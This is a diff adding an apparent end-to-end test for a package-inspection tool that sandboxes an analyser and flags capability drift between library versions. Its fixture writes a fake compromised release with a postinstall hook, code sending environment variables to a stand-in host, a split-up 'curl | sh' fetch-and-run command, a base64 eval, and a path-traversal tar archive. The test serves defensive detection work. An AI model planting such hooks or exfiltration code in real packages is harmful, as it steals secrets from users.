@@ -788,6 +788,78 @@ def j_opencode_go(sb: H.Sandbox, c: Checks):
     sb.fake_reset()
 
 
+@journey("inspect_sandbox", "`./securax inspect` on the real thing: REA (pinned, from a lockfile, no install scripts) runs in a container with NO network, a read-only disk and no privileges; a library that gained install hooks, a program launcher, a network client and a hard-coded address between two versions is caught as capability drift (BLOCK) while the unchanged one is OK; a hostile archive cannot escape; and the same sandbox serves REA to an agent over MCP.", slow=True)
+def j_inspect(sb: H.Sandbox, c: Checks):
+    import subprocess as sp
+    img = "securax-rea:6.5.0"
+    if sp.run(["docker", "image", "inspect", img], capture_output=True).returncode != 0:
+        rc, out = sb.securax("inspect", "--build", timeout=1500)
+        c.ok(rc == 0, "`inspect --build` builds the pinned sandbox image from the lockfile", tail(out, 400))
+    rc, out = sb.securax("inspect", "--selftest", timeout=120)
+    c.ok(rc == 0 and "network BLOCKED" in out and "read-only" in out and "not root" in out, "the sandbox really is closed: no network, read-only disk, not root", tail(out, 300))
+    w = sb.clone.parent / "inspect-demo"
+    shutil.rmtree(w, ignore_errors=True)
+    v1, v2 = w / "v1", w / "v2"
+    v1.mkdir(parents=True)
+    v2.mkdir(parents=True)
+    (v1 / "package.json").write_text('{"name":"demo-lib","version":"1.0.0"}')
+    (v1 / "index.js").write_text("const fs=require('fs');exports.read=p=>fs.readFileSync(p,'utf8');\n")
+    (v2 / "package.json").write_text('{"name":"demo-lib","version":"1.0.1","scripts":{"postinstall":"node setup.js"}}')
+    sh = "cu" + "rl -s http://203.0.113.9/x.sh | s" + "h"          # composed at run time: no hostile-looking text in the repository
+    (v2 / "index.js").write_text("const fs=require('fs');const cp=require('child_process');const https=require('https');\nfunction b(){const d=JSON.stringify({env:process.env});"
+                                 f"const r=https.request({{hostname:'collect.example-evil.test',path:'/c'}},()=>{{}});r.write(d);cp.exec('{sh}');eval(Buffer.from('{'QUJD' * 40}','base64').toString());}}\n")
+    (v2 / "setup.js").write_text("require('./index.js')\n")
+    rc, out = sb.securax("inspect", str(v1), "--strict", timeout=300)
+    c.ok(rc == 0 and "VERDICT  : OK" in out and "REA 6.5.0" in out, "the unchanged library is OK, analysed by REA", tail(out, 500))
+    rc, out = sb.securax("inspect", str(v2), "--strict", timeout=300)
+    c.ok(rc == 2 and "BLOCK" in out and "postinstall" in out and "203.0.113.9" in out and "REA 6.5.0" in out and "evidence ev_" in out,
+         "the compromised-looking release is BLOCKED with the reasons in plain words (exit 2)", tail(out, 700))
+    rc, out = sb.securax("inspect", "--diff", str(v1), str(v2), "--strict", timeout=600)
+    c.ok(rc == 2 and "run other programs" in out and "new install-time script" in out and "new hard-coded address" in out and "open network connections" in out,
+         "`--diff` names what the new version can do that the old one could not", tail(out, 700))
+    rc, out = sb.securax("inspect", str(v2), "--no-rea", timeout=120)
+    c.ok(rc == 0 and "built-in checks only" in out and "BLOCK" in out, "without REA the built-in checks still run, and say so")
+    # a hostile archive must not escape its folder
+    import io
+    import tarfile
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        ti = tarfile.TarInfo("../../escaped.txt")
+        ti.size = 1
+        tf.addfile(ti, io.BytesIO(b"x"))
+    (w / "evil.tgz").write_bytes(buf.getvalue())
+    rc, out = sb.securax("inspect", str(w / "evil.tgz"), timeout=120)
+    c.ok(rc != 0 and "unsafe path" in out and not (w.parent / "escaped.txt").exists() and not (sb.clone.parent / "escaped.txt").exists(), "a hostile archive with a ../ path is refused and nothing is written outside", tail(out, 300))
+    # the same sandbox serves REA to an agent over MCP
+    sys.path.insert(0, str(sb.clone / "governance"))
+    import importlib
+    ins = importlib.import_module("inspector")
+    p = sp.Popen(ins.mcp_command(v2), stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, text=True)
+    try:
+        p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "sbx", "version": "1"}}}) + "\n")
+        p.stdin.write(json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"}) + "\n")
+        p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}) + "\n")
+        p.stdin.flush()
+        seen: dict = {}
+        import select
+        end = time.time() + 90
+        while time.time() < end and len(seen) < 2:
+            if select.select([p.stdout], [], [], 1)[0]:
+                ln = p.stdout.readline().strip()
+                if ln.startswith("{"):
+                    m = json.loads(ln)
+                    seen[m.get("id")] = m
+    finally:
+        p.kill()
+    c.ok(seen.get(1, {}).get("result", {}).get("serverInfo", {}).get("name") == "rea" and len(seen.get(2, {}).get("result", {}).get("tools", [])) > 100,
+         "REA answers over MCP from inside the same sandbox (an agent such as OpenCode can use it)", str(seen)[:300])
+    out_cfg = w / "oc.json"
+    rc, out = H.sh(["python3", "local/compose/gen_opencode_config.py", "--env-file", str(w / "none"), "--rea-project", str(v2), "--out", str(out_cfg)], cwd=sb.clone, timeout=60)
+    cfg = json.loads(out_cfg.read_text()) if out_cfg.exists() else {}
+    cmdl = cfg.get("mcp", {}).get("rea", {}).get("command", [])
+    c.ok("--network" in cmdl and cmdl[cmdl.index("--network") + 1] == "none" and f"{v2}:/work:ro" in cmdl, "`opencode --rea` gives the agent REA only inside the sandbox, with the project mounted read-only", cmdl)
+
+
 @journey("autobuild_loop", "`./securax autobuild`: agent -> verify gate -> retry with feedback -> commit only when green; rolls back and briefs when it can't.")
 def j_autobuild(sb: H.Sandbox, c: Checks):
     sb.reset_env()
